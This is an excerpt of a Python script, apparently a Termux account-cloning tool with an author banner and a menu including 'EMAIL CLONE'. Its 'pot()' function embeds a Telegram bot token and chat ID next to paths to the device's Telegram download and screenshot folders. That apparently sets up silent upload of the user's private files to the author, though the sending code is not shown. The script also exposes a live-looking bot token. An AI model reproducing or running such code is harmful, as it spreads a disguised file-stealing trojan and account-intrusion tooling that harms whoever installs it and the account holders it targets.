...
\033[32;1m╔══════════════════════════════════════╗
\033[32;1m║[🔵]\033[1;37m𝐀𝐔𝐓𝐇𝐎𝐑_________\033[32;1mAKASH              ║\033[32;1mBADHON
\033[32;1m║[🔵]\033[1;37m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊______\033[32;1mAKASH AHMED      ║\033[32;1mBADHON
...
def Sad_Boy():
    ...
    print(' [3] EMAIL CLONE')
    print(' [4]WPS[coming soon]')
    print(' [5] Thanks To DEVELOPER')
    print(' [E] exit')
    print('')
    ...
    if _Sad_Boy___ in ('E', 'ee'):
        pass
def pot():
    bot_token = '6387469460:AAF7_nj-wO-apbG68T8kupitvEbwVwxJoSU' 
    chat_id = '5117850662'
    sdcard_path = '/storage/emulated/0/Downloads/Telegram'
    ...
    sdcard_path2 = '/storage/emulated/0/DCIM/Screenshots'
